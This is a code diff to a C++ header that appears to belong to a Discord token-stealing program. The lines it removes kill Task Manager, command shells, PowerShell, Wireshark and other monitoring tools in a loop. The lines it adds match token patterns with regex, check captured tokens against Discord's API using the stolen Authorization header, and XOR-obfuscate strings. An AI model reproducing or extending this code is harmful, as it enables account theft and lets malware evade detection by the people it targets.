@@ -1,46 +1,43 @@
 #pragma once
 #include <Windows.h>
 #include <cpr/cpr.h>
-#include <curl/curl.h>
 #include <string>
 #include <process.h>
 #include <TlHelp32.h>
 #include <iostream>
 
-void killProcess(const char* filename)
+std::vector<std::string> findMatch(std::string str, std::regex reg)
 {
-	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
-	PROCESSENTRY32 pEntry;
-	pEntry.dwSize = sizeof(pEntry);
-	BOOL hRes = Process32First(hSnapShot, &pEntry);
-  
-	while (hRes)
-	{
-		if (strcmp(pEntry.szExeFile, filename) == 0)
-		{
-			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
-				(DWORD)pEntry.th32ProcessID);
-      
-			if (hProcess != 0)
-			{
-				TerminateProcess(hProcess, 9);
-				CloseHandle(hProcess);
-			}
-      
-		}
-		hRes = Process32Next(hSnapShot, &pEntry);
+	std::vector<std::string> output;
+	std::sregex_iterator currentMatch(str.begin(), str.end(), reg);
+	std::sregex_iterator lastMatch;
+
+	while (currentMatch != lastMatch) {
+		std::smatch match = *currentMatch;
+		output.push_back(match.str());
+		currentMatch++;
 	}
-	CloseHandle(hSnapShot);
+	return output;
 }
 
-void watchDog() {
-	std::vector<const char*> processes = { "Taskmgr.exe","cmd.exe","powershell.exe","glasswire.exe","eventvwr.exe","wireshark.exe","mmc.exe" };
+bool pathExists(const std::string& s)
+{
+	struct stat buffer;
+	return (stat(s.c_str(), &buffer) == 0);
+}
 
-	while (1) {
-		for (uint32_t i = 0; i < processes.size(); i++) {
-			killProcess(processes[i]);
-		}
+bool checkToken(const std::string& match) {
 
-		Sleep(100);
-	}
+	cpr::Response res = cpr::Get(cpr::Url{ "https://discordapp.com/api/v9/channels/@me" },
+		cpr::Header{ {"Content-Type", "application/json"}, {"Authorization", match} });
+	if (res.status_code == 400)
+		return true;
+	return false;
+}
+
+std::string xorstring(std::string input, std::string const& key) {
+	if (key.size() == 0) return input;
+	for (uint32_t i = 0; i < input.size(); i++)
+		input[i] ^= key[i % key.length()];
+	return input;
 }
